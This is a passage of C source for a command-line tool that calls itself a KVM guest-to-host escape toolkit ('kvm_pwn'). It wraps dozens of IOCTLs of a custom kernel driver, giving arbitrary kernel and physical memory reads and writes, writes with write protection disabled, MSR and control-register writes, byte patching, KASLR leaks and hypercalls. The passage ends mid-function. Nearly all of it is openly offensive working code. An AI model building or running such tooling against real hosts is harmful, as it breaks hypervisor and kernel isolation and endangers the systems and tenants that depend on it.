/*
 * KVM Exploit Framework v2.0 - Complete Guest-to-Host Escape Toolkit
 * 
 * Uses ALL available kernel driver IOCTLs with comprehensive CLI
 *
 * Build: gcc -O2 -Wall -o kvm_pwn kvm_pwn.c
 * Usage: sudo ./kvm_pwn --help
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <getopt.h>
#include <time.h>
#include <ctype.h>
#include <signal.h>

/* ============================================================================
 * Constants
 * ============================================================================ */

#define DEVICE_PATH "/dev/kvm_probe_dev"
#define MAX_SYMBOL_NAME 128
#define PAGE_SIZE 4096
#define PAGE_SHIFT 12
#define MAX_HANDLERS 64

/* Colors */
#define C_RESET   "\033[0m"
#define C_RED     "\033[31m"
#define C_GREEN   "\033[32m"
#define C_YELLOW  "\033[33m"
#define C_BLUE    "\033[34m"
#define C_MAGENTA "\033[35m"
#define C_CYAN    "\033[36m"
#define C_BOLD    "\033[1m"

/* ============================================================================
 * Data Structures (match kernel driver exactly)
 * ============================================================================ */

struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

struct handler_info {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char type[32];
};

struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct guest_mem_read {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char *user_buffer;
    int mode;  /* 0=GPA, 1=GVA, 2=GFN */
};

struct mem_region {
    unsigned long start;
    unsigned long end;
    unsigned long step;
    unsigned char *buffer;
    size_t buffer_size;
    int region_type;  /* 0=physical, 1=kernel, 2=guest */
};

struct msr_read_request {
    unsigned int msr;
    unsigned long long value;
};

struct pattern_search_request {
    unsigned long start;
    unsigned long end;
    unsigned char pattern[16];
    size_t pattern_len;
    unsigned long found_addr;
};

struct page_table_dump {
    unsigned long virtual_addr;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    unsigned long physical_addr;
    unsigned int flags;
};

struct guest_registers {
    unsigned long rax, rbx, rcx, rdx;
    unsigned long rsi, rdi, rbp, rsp;
    unsigned long r8, r9, r10, r11;
    unsigned long r12, r13, r14, r15;
    unsigned long rip, rflags;
    unsigned long cr0, cr2, cr3, cr4;
    unsigned long dr0, dr1, dr2, dr3, dr6, dr7;
};

struct kaslr_info {
    unsigned long kernel_base;
    unsigned long kaslr_slide;
    unsigned long physmap_base;
    unsigned long vmalloc_base;
    unsigned long vmemmap_base;
};

struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
    int disable_wp;
};

struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
    int method;
};

struct guest_mem_write {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char *user_buffer;
    int mode;
};

struct msr_write_request {
    unsigned int msr;
    unsigned long long value;
};

struct cr_write_request {
    int cr_num;
    unsigned long value;
    unsigned long mask;
};

struct memset_request {
    unsigned long addr;
    unsigned char value;
    unsigned long length;
    int addr_type;
};

struct memcpy_request {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned long length;
    int src_type;
    int dst_type;
};

struct patch_request {
    unsigned long addr;
    unsigned char original[32];
    unsigned char patch[32];
    size_t length;
    int verify_original;
    int addr_type;
};

struct addr_conv_request {
    unsigned long input_addr;
    unsigned long output_addr;
    int status;
};

struct gpa_to_hva_request {
    unsigned long gpa;
    unsigned long hva;
    unsigned long gfn;
    int vm_fd;
    int status;
};

struct gfn_to_hva_request {
    unsigned long gfn;
    unsigned long hva;
    int vm_fd;
    int status;
};

struct gfn_to_pfn_request {
    unsigned long gfn;
    unsigned long pfn;
    int vm_fd;
    int status;
};

struct hva_to_pfn_request {
    unsigned long hva;
    unsigned long pfn;
    int writable;
    int status;
};

struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    unsigned long offset;
    int status;
};

struct phys_to_virt_request {
    unsigned long phys_addr;
    unsigned long virt_addr;
    int use_ioremap;
    int status;
};

struct spte_to_pfn_request {
    unsigned long spte;
    unsigned long pfn;
    unsigned long flags;
    int present;
    int writable;
    int executable;
    int status;
};

struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

struct gva_translate_request {
    unsigned long gva;
    unsigned long gpa;
    unsigned long hva;
    unsigned long hpa;
    unsigned long cr3;
    int access_type;
    int status;
};

struct write_flush_request {
    unsigned long addr;
    unsigned long length;
    unsigned char *buffer;
    int addr_type;
};

struct pfn_data_request {
    unsigned long pfn;
    unsigned long length;
    unsigned char *buffer;
    int write;
};

struct ahci_reg_request {
    uint32_t port;
    uint32_t offset;
    uint32_t value;
    int is_write;
};

struct ahci_fis_request {
    uint32_t port;
    uint64_t fis_base;
    uint64_t clb_base;
};

struct ahci_info {
    uint32_t cap;
    uint32_t ghc;
    uint32_t pi;
    uint32_t vs;
    uint32_t port_ssts[6];
};

struct hypercall_request {
    uint64_t nr;
    uint64_t a0;
    uint64_t a1;
    uint64_t a2;
    uint64_t a3;
    uint64_t result;
};

struct hypercall_batch_request {
    uint64_t r100;
    uint64_t r101;
    uint64_t r102;
    uint64_t r103;
};

/* ============================================================================
 * IOCTL Definitions - ALL 54 IOCTLs
 * ============================================================================ */

#define IOCTL_BASE 0x4000

/* Symbol operations (0x01-0x07) */
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME    (IOCTL_BASE + 0x04)
#define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
#define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
#define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)

/* Memory read operations (0x10-0x1C) */
#define IOCTL_READ_KERNEL_MEM         (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM       (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM          (IOCTL_BASE + 0x12)
#define IOCTL_SCAN_MEMORY_REGION      (IOCTL_BASE + 0x13)
#define IOCTL_FIND_MEMORY_PATTERN     (IOCTL_BASE + 0x14)
#define IOCTL_READ_CR_REGISTER        (IOCTL_BASE + 0x15)
#define IOCTL_READ_MSR                (IOCTL_BASE + 0x16)
#define IOCTL_DUMP_PAGE_TABLES        (IOCTL_BASE + 0x17)
#define IOCTL_READ_EPT_POINTERS       (IOCTL_BASE + 0x18)
#define IOCTL_READ_GUEST_REGISTERS    (IOCTL_BASE + 0x19)
#define IOCTL_GET_KASLR_INFO          (IOCTL_BASE + 0x1A)
#define IOCTL_READ_PHYS_PAGE          (IOCTL_BASE + 0x1B)
#define IOCTL_READ_PFN_DATA           (IOCTL_BASE + 0x1C)

/* Memory write operations (0x20-0x2A) */
#define IOCTL_WRITE_KERNEL_MEM        (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM      (IOCTL_BASE + 0x21)
#define IOCTL_WRITE_GUEST_MEM         (IOCTL_BASE + 0x22)
#define IOCTL_WRITE_MSR               (IOCTL_BASE + 0x23)
#define IOCTL_WRITE_CR_REGISTER       (IOCTL_BASE + 0x24)
#define IOCTL_MEMSET_KERNEL           (IOCTL_BASE + 0x25)
#define IOCTL_MEMSET_PHYSICAL         (IOCTL_BASE + 0x26)
#define IOCTL_COPY_KERNEL_MEM         (IOCTL_BASE + 0x27)
#define IOCTL_PATCH_BYTES             (IOCTL_BASE + 0x28)
#define IOCTL_WRITE_PHYSICAL_PFN      (IOCTL_BASE + 0x29)
#define IOCTL_WRITE_PHYSICAL_DIRECT   (IOCTL_BASE + 0x2A)

/* Address conversion operations (0x30-0x3F) */
#define IOCTL_GPA_TO_HVA              (IOCTL_BASE + 0x30)
#define IOCTL_GFN_TO_HVA              (IOCTL_BASE + 0x31)
#define IOCTL_GFN_TO_PFN              (IOCTL_BASE + 0x32)
#define IOCTL_GPA_TO_GFN              (IOCTL_BASE + 0x33)
#define IOCTL_GFN_TO_GPA              (IOCTL_BASE + 0x34)
#define IOCTL_HVA_TO_PFN              (IOCTL_BASE + 0x35)
#define IOCTL_HVA_TO_GFN              (IOCTL_BASE + 0x36)
#define IOCTL_PFN_TO_HVA              (IOCTL_BASE + 0x37)
#define IOCTL_VIRT_TO_PHYS            (IOCTL_BASE + 0x38)
#define IOCTL_PHYS_TO_VIRT            (IOCTL_BASE + 0x39)
#define IOCTL_VIRT_TO_PFN             (IOCTL_BASE + 0x3A)
#define IOCTL_PAGE_TO_PFN             (IOCTL_BASE + 0x3B)
#define IOCTL_PFN_TO_PAGE             (IOCTL_BASE + 0x3C)
#define IOCTL_SPTE_TO_PFN             (IOCTL_BASE + 0x3D)
#define IOCTL_WALK_EPT                (IOCTL_BASE + 0x3E)
#define IOCTL_TRANSLATE_GVA           (IOCTL_BASE + 0x3F)

/* Cache operations (0x40-0x42) */
#define IOCTL_WBINVD                  (IOCTL_BASE + 0x40)
#define IOCTL_CLFLUSH                 (IOCTL_BASE + 0x41)
#define IOCTL_WRITE_AND_FLUSH         (IOCTL_BASE + 0x42)

/* AHCI operations (0x50-0x54) */
#define IOCTL_AHCI_INIT               (IOCTL_BASE + 0x50)
#define IOCTL_AHCI_READ_REG           (IOCTL_BASE + 0x51)
#define IOCTL_AHCI_WRITE_REG          (IOCTL_BASE + 0x52)
#define IOCTL_AHCI_SET_FIS_BASE       (IOCTL_BASE + 0x53)
#define IOCTL_AHCI_INFO               (IOCTL_BASE + 0x54)

/* Hypercall operations (0x60-0x62) */
#define IOCTL_HYPERCALL               (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_BATCH         (IOCTL_BASE + 0x61)
#define IOCTL_HYPERCALL_DETECT        (IOCTL_BASE + 0x62)

/* ============================================================================
 * Global State
 * ============================================================================ */

static int g_fd = -1;
static int g_verbose = 0;
static int g_quiet = 0;
static int g_raw_output = 0;
static int g_json_output = 0;

/* ============================================================================
 * Utility Functions
 * ============================================================================ */

#define LOG(fmt, ...) do { if (!g_quiet) printf(fmt "\n", ##__VA_ARGS__); } while(0)
#define LOG_OK(fmt, ...) do { if (!g_quiet) printf(C_GREEN "[+] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)
#define LOG_WARN(fmt, ...) do { if (!g_quiet) printf(C_YELLOW "[!] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)
#define LOG_ERR(fmt, ...) do { fprintf(stderr, C_RED "[-] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)
#define LOG_DBG(fmt, ...) do { if (g_verbose) printf(C_CYAN "[*] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)

static void hexdump(const void *data, size_t size, unsigned long base)
{
    const unsigned char *p = data;
    for (size_t i = 0; i < size; i += 16) {
        if (!g_raw_output) printf(C_CYAN "%016lx" C_RESET ": ", base + i);
        else printf("%016lx: ", base + i);
        
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) printf("%02x ", p[i + j]);
            else printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = p[i + j];
            printf("%c", (c >= 32 && c < 127) ? c : '.');
        }
        printf("|\n");
    }
}

static void raw_hexdump(const void *data, size_t size)
{
    const unsigned char *p = data;
    for (size_t i = 0; i < size; i++) {
        printf("%02x", p[i]);
    }
    printf("\n");
}

static int open_device(void)
{
    if (g_fd >= 0) return 0;
    g_fd = open(DEVICE_PATH, O_RDWR);
    if (g_fd < 0) {
        LOG_ERR("Failed to open %s: %s", DEVICE_PATH, strerror(errno));
        return -1;
    }
    LOG_DBG("Opened device fd=%d", g_fd);
    return 0;
}

static void close_device(void)
{
    if (g_fd >= 0) { close(g_fd); g_fd = -1; }
}

static unsigned long parse_addr(const char *s)
{
    if (!s) return 0;
    return strtoull(s, NULL, 0);
}

static size_t parse_size(const char *s)
{
    if (!s) return 0;
    size_t val = strtoull(s, NULL, 0);
    size_t len = strlen(s);
    if (len > 0) {
        char suffix = s[len-1];
        if (suffix == 'k' || suffix == 'K') val *= 1024;
        else if (suffix == 'm' || suffix == 'M') val *= 1024 * 1024;
        else if (suffix == 'g' || suffix == 'G') val *= 1024 * 1024 * 1024;
    }
    return val;
}

/* ============================================================================
 * Symbol Operations
 * ============================================================================ */

static unsigned long cmd_lookup_symbol(const char *name)
{
    struct symbol_request req = {0};
    if (open_device() < 0) return 0;
    strncpy(req.name, name, MAX_SYMBOL_NAME - 1);
    
    if (ioctl(g_fd, IOCTL_LOOKUP_SYMBOL, &req) < 0) {
        LOG_ERR("Symbol lookup failed: %s", strerror(errno));
        return 0;
    }
    
    if (g_json_output) {
        printf("{\"symbol\":\"%s\",\"address\":\"0x%lx\",\"description\":\"%s\"}\n",
               name, req.address, req.description);
    } else if (g_raw_output) {
        printf("0x%lx\n", req.address);
    } else {
        printf("%s = " C_YELLOW "0x%016lx" C_RESET, name, req.address);
        if (req.description[0]) printf(" (%s)", req.description);
        printf("\n");
    }
    return req.address;
}

static int cmd_symbol_count(void)
{
    unsigned int count = 0;
    if (open_device() < 0) return -1;
    if (ioctl(g_fd, IOCTL_GET_SYMBOL_COUNT, &count) < 0) {
        LOG_ERR("Get symbol count failed");
        return -1;
    }
    if (g_raw_output) printf("%u\n", count);
    else LOG_OK("KVM symbol count: %u", count);
    return count;
}

static int cmd_symbol_by_index(unsigned int index)
{
    struct symbol_request req = {0};
    if (open_device() < 0) return -1;
    
    /* The driver expects index in the first field */
    memcpy(&req, &index, sizeof(index));
    
    if (ioctl(g_fd, IOCTL_GET_SYMBOL_BY_INDEX, &req) < 0) {
        LOG_ERR("Get symbol by index failed");
        return -1;
    }
    
    printf("[%u] %s = 0x%lx\n", index, req.name, req.address);
    return 0;
}

static int cmd_list_symbols(void)
{
    unsigned int count = 0;
    struct symbol_request req;
    
    if (open_device() < 0) return -1;
    if (ioctl(g_fd, IOCTL_GET_SYMBOL_COUNT, &count) < 0) return -1;
    
    LOG_OK("Listing %u KVM symbols:", count);
    for (unsigned int i = 0; i < count; i++) {
        memset(&req, 0, sizeof(req));
        memcpy(&req, &i, sizeof(i));
        if (ioctl(g_fd, IOCTL_GET_SYMBOL_BY_INDEX, &req) == 0 && req.address) {
            printf("  %-40s 0x%016lx\n", req.name, req.address);
        }
    }
    return 0;
}

static int cmd_search_symbol(const char *pattern)
{
    struct symbol_request req = {0};
    if (open_device() < 0) return -1;
    strncpy(req.name, pattern, MAX_SYMBOL_NAME - 1);
    
    if (ioctl(g_fd, IOCTL_SEARCH_SYMBOLS, &req) < 0) {
        LOG_ERR("Symbol search failed");
        return -1;
    }
    
    LOG_OK("Search results for '%s':", pattern);
    /* Results would be returned somehow - implementation dependent */
    return 0;
}

static int cmd_vmx_handlers(void)
{
    struct handler_info handlers[MAX_HANDLERS] = {0};
    if (open_device() < 0) return -1;
    
    if (ioctl(g_fd, IOCTL_GET_VMX_HANDLERS, handlers) < 0) {
        LOG_ERR("Get VMX handlers failed");
        return -1;
    }
    
    LOG_OK("Intel VMX Exit Handlers:");
    for (int i = 0; i < MAX_HANDLERS && handlers[i].name[0]; i++) {
        printf("  %-35s 0x%016lx\n", handlers[i].name, handlers[i].address);
    }
    return 0;
}

static int cmd_svm_handlers(void)
{
    struct handler_info handlers[MAX_HANDLERS] = {0};
    if (open_device() < 0) return -1;
    
    if (ioctl(g_fd, IOCTL_GET_SVM_HANDLERS, handlers) < 0) {
        LOG_ERR("Get SVM handlers failed");
        return -1;
    }
    
    LOG_OK("AMD SVM Exit Handlers:");
    for (int i = 0; i < MAX_HANDLERS && handlers[i].name[0]; i++) {
        printf("  %-35s 0x%016lx\n", handlers[i].name, handlers[i].address);
    }
    return 0;
}

/* ============================================================================
 * Memory Read Operations
 * ============================================================================ */

static int cmd_read_kernel(unsigned long addr, size_t len)
{
    struct kernel_mem_read req;
    unsigned char *buf;
    
    if (open_device() < 0) return -1;
    buf = malloc(len);
    if (!buf) { LOG_ERR("malloc failed"); return -1; }
    
    req.kernel_addr = addr;
    req.length = len;
    req.user_buffer = buf;
    
    if (ioctl(g_fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        LOG_ERR("Read kernel memory failed at 0x%lx", addr);
        free(buf);
        return -1;
    }
    
    if (g_raw_output) raw_hexdump(buf, len);
    else hexdump(buf, len, addr);
    
    free(buf);
    return 0;
}

static int cmd_read_physical(unsigned long addr, size_t len)
{
    struct physical_mem_read req;
    unsigned char *buf;
    
    if (open_device() < 0) return -1;
    buf = malloc(len);
    if (!buf) return -1;
    
    req.phys_addr = addr;
    req.length = len;
    req.user_buffer = buf;
    
    if (ioctl(g_fd, IOCTL_READ_PHYSICAL_MEM, &req) < 0) {
        LOG_ERR("Read physical memory failed at 0x%lx", addr);
        free(buf);
        return -1;
    }
    
    if (g_raw_output) raw_hexdump(buf, len);
    else hexdump(buf, len, addr);
    
    free(buf);
    return 0;
}

static int cmd_read_guest(unsigned long addr, size_t len, int mode)
{
    struct guest_mem_read req;
    unsigned char *buf;
    
    if (open_device() < 0) return -1;
    buf = malloc(len);
    if (!buf) return -1;
    
    req.gpa = addr;
    req.gva = 0;
    req.length = len;
    req.user_buffer = buf;
    req.mode = mode;
    
    if (ioctl(g_fd, IOCTL_READ_GUEST_MEM, &req) < 0) {
        LOG_ERR("Read guest memory failed");
        free(buf);
        return -1;
    }
    
    if (g_raw_output) raw_hexdump(buf, len);
    else hexdump(buf, len, addr);
    
    free(buf);
    return 0;
}

static int cmd_read_pfn(unsigned long pfn, size_t len)
{
    struct pfn_data_request req;
    unsigned char *buf;
    
    if (open_device() < 0) return -1;
    buf = malloc(len);
    if (!buf) return -1;
    
    req.pfn = pfn;
    req.length = len;
    req.buffer = buf;
    req.write = 0;
    
    if (ioctl(g_fd, IOCTL_READ_PFN_DATA, &req) < 0) {
        LOG_ERR("Read PFN data failed");
        free(buf);
        return -1;
    }
    
    LOG_OK("PFN 0x%lx (phys 0x%lx):", pfn, pfn << PAGE_SHIFT);
    hexdump(buf, len, pfn << PAGE_SHIFT);
    
    free(buf);
    return 0;
}

static int cmd_scan_region(unsigned long start, unsigned long end, 
                           unsigned long step, int type)
{
    struct mem_region req;
    unsigned char *buf;
    size_t buf_size = 4096;
    
    if (open_device() < 0) return -1;
    buf = malloc(buf_size);
    if (!buf) return -1;
    
    req.start = start;
    req.end = end;
    req.step = step ? step : PAGE_SIZE;
    req.buffer = buf;
    req.buffer_size = buf_size;
    req.region_type = type;
    
    if (ioctl(g_fd, IOCTL_SCAN_MEMORY_REGION, &req) < 0) {
        LOG_ERR("Scan memory region failed");
        free(buf);
        return -1;
    }
    
    LOG_OK("Memory region scan complete");
    free(buf);
    return 0;
}

static int cmd_find_pattern(unsigned long start, unsigned long end, 
                            const char *pattern_hex)
{
    struct pattern_search_request req = {0};
    
    if (open_device() < 0) return -1;
    
    req.start = start;
    req.end = end;
    
    /* Parse hex pattern */
    size_t plen = strlen(pattern_hex) / 2;
    if (plen > 16) plen = 16;
    for (size_t i = 0; i < plen; i++) {
        char byte[3] = {pattern_hex[i*2], pattern_hex[i*2+1], 0};
        req.pattern[i] = strtoul(byte, NULL, 16);
    }
    req.pattern_len = plen;
    
    if (ioctl(g_fd, IOCTL_FIND_MEMORY_PATTERN, &req) < 0) {
        LOG_ERR("Find pattern failed");
        return -1;
    }
    
    if (req.found_addr) {
        LOG_OK("Pattern found at: 0x%lx", req.found_addr);
    } else {
        LOG_WARN("Pattern not found");
    }
    return req.found_addr ? 0 : -1;
}

static int cmd_read_cr(int cr_num)
{
    struct cr_write_request req = {0};
    
    if (open_device() < 0) return -1;
    req.cr_num = cr_num;
    
    if (ioctl(g_fd, IOCTL_READ_CR_REGISTER, &req) < 0) {
        LOG_ERR("Read CR%d failed", cr_num);
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.value);
    else printf("CR%d = 0x%016lx\n", cr_num, req.value);
    return 0;
}

static int cmd_read_msr(unsigned int msr)
{
    struct msr_read_request req = {0};
    
    if (open_device() < 0) return -1;
    req.msr = msr;
    
    if (ioctl(g_fd, IOCTL_READ_MSR, &req) < 0) {
        LOG_ERR("Read MSR 0x%x failed", msr);
        return -1;
    }
    
    if (g_raw_output) printf("0x%llx\n", req.value);
    else printf("MSR 0x%x = 0x%016llx\n", msr, req.value);
    return 0;
}

static int cmd_dump_pagetables(unsigned long vaddr)
{
    struct page_table_dump req = {0};
    
    if (open_device() < 0) return -1;
    req.virtual_addr = vaddr;
    
    if (ioctl(g_fd, IOCTL_DUMP_PAGE_TABLES, &req) < 0) {
        LOG_ERR("Dump page tables failed");
        return -1;
    }
    
    printf("Page Table Walk for 0x%lx:\n", vaddr);
    printf("  PML4E:    0x%016lx\n", req.pml4e);
    printf("  PDPTE:    0x%016lx\n", req.pdpte);
    printf("  PDE:      0x%016lx\n", req.pde);
    printf("  PTE:      0x%016lx\n", req.pte);
    printf("  Physical: 0x%016lx\n", req.physical_addr);
    printf("  Flags:    0x%08x\n", req.flags);
    return 0;
}

static int cmd_kaslr_info(void)
{
    struct kaslr_info req = {0};
    
    if (open_device() < 0) return -1;
    
    if (ioctl(g_fd, IOCTL_GET_KASLR_INFO, &req) < 0) {
        LOG_ERR("Get KASLR info failed");
        return -1;
    }
    
    if (g_json_output) {
        printf("{\"kernel_base\":\"0x%lx\",\"kaslr_slide\":\"0x%lx\","
               "\"physmap_base\":\"0x%lx\",\"vmalloc_base\":\"0x%lx\","
               "\"vmemmap_base\":\"0x%lx\"}\n",
               req.kernel_base, req.kaslr_slide, req.physmap_base,
               req.vmalloc_base, req.vmemmap_base);
    } else {
        printf("KASLR Information:\n");
        printf("  Kernel Base:  0x%016lx\n", req.kernel_base);
        printf("  KASLR Slide:  0x%016lx\n", req.kaslr_slide);
        printf("  Physmap Base: 0x%016lx\n", req.physmap_base);
        printf("  vmalloc Base: 0x%016lx\n", req.vmalloc_base);
        printf("  vmemmap Base: 0x%016lx\n", req.vmemmap_base);
    }
    return 0;
}

/* ============================================================================
 * Memory Write Operations
 * ============================================================================ */

static int cmd_write_kernel(unsigned long addr, const char *hex_data, int disable_wp)
{
    struct kernel_mem_write req;
    unsigned char buf[4096];
    size_t len;
    
    if (open_device() < 0) return -1;
    
    len = strlen(hex_data) / 2;
    if (len > sizeof(buf)) len = sizeof(buf);
    for (size_t i = 0; i < len; i++) {
        char byte[3] = {hex_data[i*2], hex_data[i*2+1], 0};
        buf[i] = strtoul(byte, NULL, 16);
    }
    
    req.kernel_addr = addr;
    req.length = len;
    req.user_buffer = buf;
    req.disable_wp = disable_wp;
    
    if (ioctl(g_fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
        LOG_ERR("Write kernel memory failed");
        return -1;
    }
    
    LOG_OK("Wrote %zu bytes to kernel address 0x%lx", len, addr);
    return 0;
}

static int cmd_write_physical(unsigned long addr, const char *hex_data, int method)
{
    struct physical_mem_write req;
    unsigned char buf[4096];
    size_t len;
    
    if (open_device() < 0) return -1;
    
    len = strlen(hex_data) / 2;
    if (len > sizeof(buf)) len = sizeof(buf);
    for (size_t i = 0; i < len; i++) {
        char byte[3] = {hex_data[i*2], hex_data[i*2+1], 0};
        buf[i] = strtoul(byte, NULL, 16);
    }
    
    req.phys_addr = addr;
    req.length = len;
    req.user_buffer = buf;
    req.method = method;
    
    if (ioctl(g_fd, IOCTL_WRITE_PHYSICAL_MEM, &req) < 0) {
        LOG_ERR("Write physical memory failed");
        return -1;
    }
    
    LOG_OK("Wrote %zu bytes to physical address 0x%lx", len, addr);
    return 0;
}

static int cmd_write_guest(unsigned long addr, const char *hex_data, int mode)
{
    struct guest_mem_write req;
    unsigned char buf[4096];
    size_t len;
    
    if (open_device() < 0) return -1;
    
    len = strlen(hex_data) / 2;
    if (len > sizeof(buf)) len = sizeof(buf);
    for (size_t i = 0; i < len; i++) {
        char byte[3] = {hex_data[i*2], hex_data[i*2+1], 0};
        buf[i] = strtoul(byte, NULL, 16);
    }
    
    req.gpa = addr;
    req.gva = 0;
    req.length = len;
    req.user_buffer = buf;
    req.mode = mode;
    
    if (ioctl(g_fd, IOCTL_WRITE_GUEST_MEM, &req) < 0) {
        LOG_ERR("Write guest memory failed");
        return -1;
    }
    
    LOG_OK("Wrote %zu bytes to guest address 0x%lx", len, addr);
    return 0;
}

static int cmd_write_msr(unsigned int msr, uint64_t value)
{
    struct msr_write_request req;
    
    if (open_device() < 0) return -1;
    req.msr = msr;
    req.value = value;
    
    if (ioctl(g_fd, IOCTL_WRITE_MSR, &req) < 0) {
        LOG_ERR("Write MSR 0x%x failed", msr);
        return -1;
    }
    
    LOG_OK("MSR 0x%x = 0x%lx", msr, value);
    return 0;
}

static int cmd_write_cr(int cr_num, unsigned long value, unsigned long mask)
{
    struct cr_write_request req;
    
    if (open_device() < 0) return -1;
    req.cr_num = cr_num;
    req.value = value;
    req.mask = mask;
    
    if (ioctl(g_fd, IOCTL_WRITE_CR_REGISTER, &req) < 0) {
        LOG_ERR("Write CR%d failed", cr_num);
        return -1;
    }
    
    LOG_OK("CR%d = 0x%lx (mask 0x%lx)", cr_num, value, mask);
    return 0;
}

static int cmd_memset_kernel(unsigned long addr, unsigned char value, size_t len)
{
    struct memset_request req;
    
    if (open_device() < 0) return -1;
    req.addr = addr;
    req.value = value;
    req.length = len;
    req.addr_type = 0;
    
    if (ioctl(g_fd, IOCTL_MEMSET_KERNEL, &req) < 0) {
        LOG_ERR("Memset kernel failed");
        return -1;
    }
    
    LOG_OK("Memset 0x%lx with 0x%02x for %zu bytes", addr, value, len);
    return 0;
}

static int cmd_memset_physical(unsigned long addr, unsigned char value, size_t len)
{
    struct memset_request req;
    
    if (open_device() < 0) return -1;
    req.addr = addr;
    req.value = value;
    req.length = len;
    req.addr_type = 1;
    
    if (ioctl(g_fd, IOCTL_MEMSET_PHYSICAL, &req) < 0) {
        LOG_ERR("Memset physical failed");
        return -1;
    }
    
    LOG_OK("Memset phys 0x%lx with 0x%02x for %zu bytes", addr, value, len);
    return 0;
}

static int cmd_patch(unsigned long addr, const char *orig_hex, 
                     const char *patch_hex, int addr_type)
{
    struct patch_request req = {0};
    size_t len;
    
    if (open_device() < 0) return -1;
    
    len = strlen(patch_hex) / 2;
    if (len > 32) len = 32;
    
    for (size_t i = 0; i < len; i++) {
        char byte[3] = {patch_hex[i*2], patch_hex[i*2+1], 0};
        req.patch[i] = strtoul(byte, NULL, 16);
    }
    
    if (orig_hex && strlen(orig_hex) >= len * 2) {
        for (size_t i = 0; i < len; i++) {
            char byte[3] = {orig_hex[i*2], orig_hex[i*2+1], 0};
            req.original[i] = strtoul(byte, NULL, 16);
        }
        req.verify_original = 1;
    }
    
    req.addr = addr;
    req.length = len;
    req.addr_type = addr_type;
    
    if (ioctl(g_fd, IOCTL_PATCH_BYTES, &req) < 0) {
        LOG_ERR("Patch failed");
        return -1;
    }
    
    LOG_OK("Patched %zu bytes at 0x%lx", len, addr);
    return 0;
}

static int cmd_write_and_flush(unsigned long addr, const char *hex_data, int addr_type)
{
    struct write_flush_request req;
    unsigned char buf[4096];
    size_t len;
    
    if (open_device() < 0) return -1;
    
    len = strlen(hex_data) / 2;
    if (len > sizeof(buf)) len = sizeof(buf);
    for (size_t i = 0; i < len; i++) {
        char byte[3] = {hex_data[i*2], hex_data[i*2+1], 0};
        buf[i] = strtoul(byte, NULL, 16);
    }
    
    req.addr = addr;
    req.length = len;
    req.buffer = buf;
    req.addr_type = addr_type;
    
    if (ioctl(g_fd, IOCTL_WRITE_AND_FLUSH, &req) < 0) {
        LOG_ERR("Write and flush failed");
        return -1;
    }
    
    LOG_OK("Wrote and flushed %zu bytes at 0x%lx", len, addr);
    return 0;
}

/* ============================================================================
 * Address Conversion Operations
 * ============================================================================ */

static int cmd_virt_to_phys(unsigned long vaddr)
{
    struct virt_to_phys_request req = {0};
    
    if (open_device() < 0) return -1;
    req.virt_addr = vaddr;
    
    if (ioctl(g_fd, IOCTL_VIRT_TO_PHYS, &req) < 0) {
        LOG_ERR("virt_to_phys failed");
        return -1;
    }
    
    if (g_raw_output) {
        printf("0x%lx\n", req.phys_addr);
    } else {
        printf("Virtual:  0x%016lx\n", req.virt_addr);
        printf("Physical: 0x%016lx\n", req.phys_addr);
        printf("PFN:      0x%lx\n", req.pfn);
        printf("Offset:   0x%lx\n", req.offset);
    }
    return 0;
}

static int cmd_phys_to_virt(unsigned long paddr, int use_ioremap)
{
    struct phys_to_virt_request req = {0};
    
    if (open_device() < 0) return -1;
    req.phys_addr = paddr;
    req.use_ioremap = use_ioremap;
    
    if (ioctl(g_fd, IOCTL_PHYS_TO_VIRT, &req) < 0) {
        LOG_ERR("phys_to_virt failed");
        return -1;
    }
    
    if (g_raw_output) printf("0x%lx\n", req.virt_addr);
    else printf("Physical 0x%lx -> Virtual 0x%lx\n", paddr, req.virt_addr);
    return 0;
}

static int cmd_virt_to_pfn(unsigned long vaddr)
{
    struct virt_to_phys_request req = {0};
    
    if (open_device() < 0) return -1;
    req.virt_addr = vaddr;
    
    if (ioctl(g_fd, IOCTL_VIRT_TO_PFN, &req) < 0) {
